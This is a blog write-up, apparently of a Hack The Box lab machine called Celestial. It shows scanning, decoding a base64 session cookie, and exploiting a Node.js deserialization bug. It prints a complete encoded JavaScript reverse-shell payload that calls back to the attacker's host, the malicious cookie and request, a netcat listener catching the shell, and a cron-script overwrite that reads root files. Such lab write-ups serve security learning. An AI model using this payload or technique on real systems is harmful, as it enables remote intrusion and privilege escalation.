---
layout:     post
title:      "Hackthebox - Celestial"
date:       2018-08-25 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Hackthebox
---

This time we're going to have fun with a machine called Celestial, which is fun little box. 

### Solution

Let's start from a simple `nmap` scan. 

{% highlight text %}
root@kali:~/hackthebox/celestial# nmap 10.10.10.85
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-10 13:11 EDT
Nmap scan report for 10.10.10.85
Host is up (0.044s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 3.94 seconds
{% endhighlight %}

From here we can see one port open - `3000` with service called `ppp`. But actaully, using `curl` on it yields us a `404` error code. 

{% highlight text %}
root@kali:~/hackthebox/celestial# curl 10.10.10.85:3000
<h1>404</h1>
{% endhighlight %}

But, actually visiting this website second time (both times in a browser) gives us a completely different website. 

{% highlight text %}
http://10.10.10.85:3000/
Hey Dummy 2 + 2 is 22
{% endhighlight %}

I decided to fire up `burp`, in which we can see a `profile` cookie set, which looks like a `base64` encoded string. 

{% highlight text %}
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Tue, 10 Jul 2018 18:01:28 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Date: Tue, 10 Jul 2018 17:46:28 GMT
Connection: close

<h1>404</h1>
{% endhighlight %}

Decoding it gives us data, which is shown on the website.

{% highlight text %}
root@kali:~/hackthebox/celestial# echo "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==" | base64 -d
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
{% endhighlight %}

In addition, from `nikto` scan, we can see that the server is running `Express` which is probably `Express + NodeJS` combination. 

{% highlight text %}
root@kali:~/hackthebox/celestial# nikto -h 10.10.10.85:3000
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.85
+ Target Hostname:    10.10.10.85
+ Target Port:        3000
+ Start Time:         2018-07-10 13:28:46 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/c 0x8lfvj2TmiRRvB7K+JPws1w9h6aY 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD 
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  19 error(s) and 6 item(s) reported on remote host
+ End Time:           2018-07-10 13:35:44 (GMT-4) (418 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

From here we can just use google and find about [this awesome](https://hd7exploit.wordpress.com/2017/05/29/exploiting-node-js-deserialization-bug-for-remote-code-execution-cve-2017-5941/) RCE exploit in NodeJS unserialization. 

As we've done the same exploit in [previos machine](http://localhost:4000/vulnhub-temple-of-doom/) from Vulnhub, I decided to already move on to the reverse shell, cloned from [this repository](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py).

{% highlight text %}
root@kali:~/hackthebox/celestial# python js-reverseshell.py 10.10.15.249 6666
[+] LHOST = 10.10.15.249
[+] LPORT = 6666
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,50,52,57,34,59,10,80,79,82,84,61,34,54,54,54,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
{% endhighlight %}

Now we just have to correctly append the `rce` data into the cookie. 

{% highlight text %}
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"124124142124", "rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,50,52,57,34,59,10,80,79,82,84,61,34,54,54,54,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
{% endhighlight %}

Using `burp repeater`, we can firstly `base64` encode the cookie, and then send the contents to the website. 

{% highlight text %}
GET / HTTP/1.1
Host: 10.10.10.85:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjEyNDEyNDE0MjEyNCIsICJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDQ4LDQ2LDQ5LDQ4LDQ2LDQ5LDUzLDQ2LDUwLDUyLDU3LDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDU0LDU0LDU0LDU0LDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Cache-Control: max-age=0
{% endhighlight %}

Here's the response. 

{% highlight text %}
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 63
ETag: W/"3f-Jq3PV5CxMnkROFE+egILx77Habg"
Date: Tue, 10 Jul 2018 18:59:06 GMT
Connection: close

Hey Dummy 124124142124 + 124124142124 is 1.2412414212412412e+23
{% endhighlight %}

In the meantime our previously set up listener catched the connection from the server. 

{% highlight text %}
root@kali:~/hackthebox/celestial# nc -lvp 6666
listening on [any] 6666 ...
10.10.10.85: inverse host lookup failed: Unknown host
connect to [10.10.15.249] from (UNKNOWN) [10.10.10.85] 52254
Connected!
ls -la
total 164
drwxr-xr-x 21 sun  sun  4096 Jul 10 14:50 .
drwxr-xr-x  3 root root 4096 Sep 19  2017 ..
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe.1
-rw-------  1 sun  sun     1 Mar  4 15:24 .bash_history
-rw-r--r--  1 sun  sun   220 Sep 19  2017 .bash_logout
-rw-r--r--  1 sun  sun  3771 Sep 19  2017 .bashrc
-rwxrwxr-x  1 sun  sun   215 Jul 10 14:50 bd.pl
drwx------ 13 sun  sun  4096 Nov  8  2017 .cache
drwx------ 16 sun  sun  4096 Sep 20  2017 .config
drwx------  3 root root 4096 Sep 21  2017 .dbus
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
-rw-r--r--  1 sun  sun    25 Sep 19  2017 .dmrc
drwxr-xr-x  2 sun  sun  4096 Mar  4 15:08 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwx------  2 sun  sun  4096 Sep 21  2017 .gconf
drwx------  3 sun  sun  4096 Jul 10 14:42 .gnupg
drwx------  2 root root 4096 Sep 21  2017 .gvfs
-rw-------  1 sun  sun  6732 Jul 10 14:42 .ICEauthority
drwx------  3 sun  sun  4096 Sep 19  2017 .local
drwx------  4 sun  sun  4096 Sep 19  2017 .mozilla
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxrwxr-x  2 sun  sun  4096 Sep 19  2017 .nano
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-rw-r--  1 sun  sun    20 Sep 19  2017 .node_repl_history
drwxrwxr-x 57 sun  sun  4096 Sep 19  2017 .npm
-rw-r--r--  1 root root   21 Jul 10 14:55 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
-rw-r--r--  1 sun  sun   655 Sep 19  2017 .profile
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun    66 Sep 20  2017 .selected_editor
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
-rw-r--r--  1 sun  sun     0 Sep 19  2017 .sudo_as_admin_successful
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
-rw-------  1 sun  sun    48 Jul 10 14:42 .Xauthority
-rw-------  1 sun  sun    82 Jul 10 14:42 .xsession-errors
-rw-------  1 sun  sun  1302 Mar  7 08:33 .xsession-errors.old
{% endhighlight %}

We can spawn a better shell with `python` and look for `user.txt` flag. 

{% highlight text %}
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/sh")'
$ find . -name "user.txt"
find . -name "user.txt"
find: ‘./.gvfs’: Permission denied
find: ‘./.cache/dconf’: Permission denied
find: ‘./.dbus’: Permission denied
./Documents/user.txt
$ cat Documents/user.txt
cat Documents/user.txt

{% endhighlight %}

Now we can try and find a way to escalate. First this that we can see is the changing modified date for `output.txt` file in the home directory of our user.

{% highlight text %}
$ ls -la
ls -la
total 164
drwxr-xr-x 21 sun  sun  4096 Jul 10 14:50 .
drwxr-xr-x  3 root root 4096 Sep 19  2017 ..
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe.1
-rw-------  1 sun  sun     1 Mar  4 15:24 .bash_history
-rw-r--r--  1 sun  sun   220 Sep 19  2017 .bash_logout
-rw-r--r--  1 sun  sun  3771 Sep 19  2017 .bashrc
-rwxrwxr-x  1 sun  sun   215 Jul 10 14:50 bd.pl
drwx------ 13 sun  sun  4096 Nov  8  2017 .cache
drwx------ 16 sun  sun  4096 Sep 20  2017 .config
drwx------  3 root root 4096 Sep 21  2017 .dbus
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
-rw-r--r--  1 sun  sun    25 Sep 19  2017 .dmrc
drwxr-xr-x  2 sun  sun  4096 Mar  4 15:08 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwx------  2 sun  sun  4096 Sep 21  2017 .gconf
drwx------  3 sun  sun  4096 Jul 10 14:42 .gnupg
drwx------  2 root root 4096 Sep 21  2017 .gvfs
-rw-------  1 sun  sun  6732 Jul 10 14:42 .ICEauthority
drwx------  3 sun  sun  4096 Sep 19  2017 .local
drwx------  4 sun  sun  4096 Sep 19  2017 .mozilla
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxrwxr-x  2 sun  sun  4096 Sep 19  2017 .nano
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-rw-r--  1 sun  sun    20 Sep 19  2017 .node_repl_history
drwxrwxr-x 57 sun  sun  4096 Sep 19  2017 .npm
-rw-r--r--  1 root root   21 Jul 10 15:00 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
-rw-r--r--  1 sun  sun   655 Sep 19  2017 .profile
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun    66 Sep 20  2017 .selected_editor
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
-rw-r--r--  1 sun  sun     0 Sep 19  2017 .sudo_as_admin_successful
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
-rw-------  1 sun  sun    48 Jul 10 14:42 .Xauthority
-rw-------  1 sun  sun    82 Jul 10 14:42 .xsession-errors
-rw-------  1 sun  sun  1302 Mar  7 08:33 .xsession-errors.old

-rw-r--r--  1 root root   21 Jul 10 15:10 output.txt
-rw-r--r--  1 root root   21 Jul 10 15:30 output.txt <-- content is the same but it's being modified
{% endhighlight %}

In the same directory as the flag was `script.py` which output seemed to be put into the `output.txt` file. We can leverage our privilages to write this file by placing malicious python script that will `ls` the content of `/root` directory. After waiting for the next execution, we will have the desired output.  

{% highlight text %}
$ cd Documents
cd Documents
$ ls -la
ls -la
total 16
drwxr-xr-x  2 sun sun 4096 Mar  4 15:08 .
drwxr-xr-x 21 sun sun 4096 Jul 10 16:04 ..
-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py
-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt
$ /bin/bash
/bin/bash
sun@sun:~/Documents$ ls -la
ls -la
total 16
drwxr-xr-x  2 sun sun 4096 Jul 10 16:06 .
drwxr-xr-x 21 sun sun 4096 Jul 10 16:04 ..
-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py
-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt
sun@sun:~$ echo "import os
echo "import os
> print(os.system('ls -la /root'))" > Documents/script.py
print(os.system('ls -la /root'))" > Documents/script.py
sun@sun:~$ cat Documents/script.py
cat Documents/script.py
import os
print(os.system('ls -la /root'))
sun@sun:~$ cat output.txt
cat output.txt
Script is running...
sun@sun:~$ ls -la output.txt
ls -la output.txt
-rw-r--r-- 1 root root 565 Jul 12 04:35 output.txt
sun@sun:~$ cat output.txt
cat output.txt
total 44
drwx------  5 root root 4096 Mar  4 10:12 .
drwxr-xr-x 24 root root 4096 Sep 19  2017 ..
-rw-------  1 root root    1 Mar  4 15:25 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 19  2016 .cache
drwx------  3 root root 4096 Sep 20  2017 .gnupg
drwxr-xr-x  2 root root 4096 Sep 19  2017 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep 21  2017 root.txt
-rw-r--r--  1 root root   29 Mar  4 10:12 script.py
-rw-r--r--  1 root root   74 Mar  4 10:10 .selected_editor
{% endhighlight %}

By waiting for another execution, we know where is flag for the root. Now let's view it using the same trick.

{% highlight text %}
sun@sun:~$ echo "import os
echo "import os
> print(os.system('cat /root/root.txt'))" > Documents/script.py
print(os.system('cat /root/root.txt'))" > Documents/script.py
sun@sun:~$ cat Documents/script.py
cat Documents/script.py
import os
print(os.system('cat /root/root.txt'))
sun@sun:~$ ls -la
ls -la
total 152
drwxr-xr-x 21 sun  sun  4096 Jul 12 04:45 .
drwxr-xr-x  3 root root 4096 Sep 19  2017 ..
-rw-------  1 sun  sun     1 Mar  4 15:24 .bash_history
-rw-r--r--  1 sun  sun   220 Sep 19  2017 .bash_logout
-rw-r--r--  1 sun  sun  3771 Sep 19  2017 .bashrc
drwx------ 13 sun  sun  4096 Nov  8  2017 .cache
drwx------ 16 sun  sun  4096 Sep 20  2017 .config
drwx------  3 root root 4096 Sep 21  2017 .dbus
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
-rw-r--r--  1 sun  sun    25 Sep 19  2017 .dmrc
drwxr-xr-x  2 sun  sun  4096 Jul 12 04:48 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwx------  2 sun  sun  4096 Sep 21  2017 .gconf
drwx------  3 sun  sun  4096 Jul 12 04:45 .gnupg
drwx------  2 root root 4096 Sep 21  2017 .gvfs
-rw-------  1 sun  sun  6732 Jul 12 04:45 .ICEauthority
drwx------  3 sun  sun  4096 Sep 19  2017 .local
drwx------  4 sun  sun  4096 Sep 19  2017 .mozilla
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxrwxr-x  2 sun  sun  4096 Sep 19  2017 .nano
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-rw-r--  1 sun  sun    20 Sep 19  2017 .node_repl_history
drwxrwxr-x 57 sun  sun  4096 Sep 19  2017 .npm
-rw-r--r--  1 root root   21 Mar  4 15:40 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
-rw-r--r--  1 sun  sun   655 Sep 19  2017 .profile
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun    66 Sep 20  2017 .selected_editor
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
-rw-r--r--  1 sun  sun     0 Sep 19  2017 .sudo_as_admin_successful
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
-rw-------  1 sun  sun    48 Jul 12 04:45 .Xauthority
-rw-------  1 sun  sun    82 Jul 12 04:45 .xsession-errors
-rw-------  1 sun  sun  1302 Mar  7 08:33 .xsession-errors.old
sun@sun:~$ cat output.txt
cat output.txt
Script is running...
sun@sun:~$ cat Documents/script.py
cat Documents/script.py
import os
print(os.system('cat /root/root.txt'))
sun@sun:~$ cat output.txt
cat output.txt
Script is running...
sun@sun:~$ cat output.txt
cat output.txt

0
{% endhighlight %}

At last, delete the `output.txt` and empty the script to do not share the flag with other attackers. 

{% highlight text %}
sun@sun:~$ rm output.txt
rm output.txt
rm: remove write-protected regular file 'output.txt'? y
y
sun@sun:~$ echo "" > Documents/script.py
echo "" > Documents/script.py
{% endhighlight %}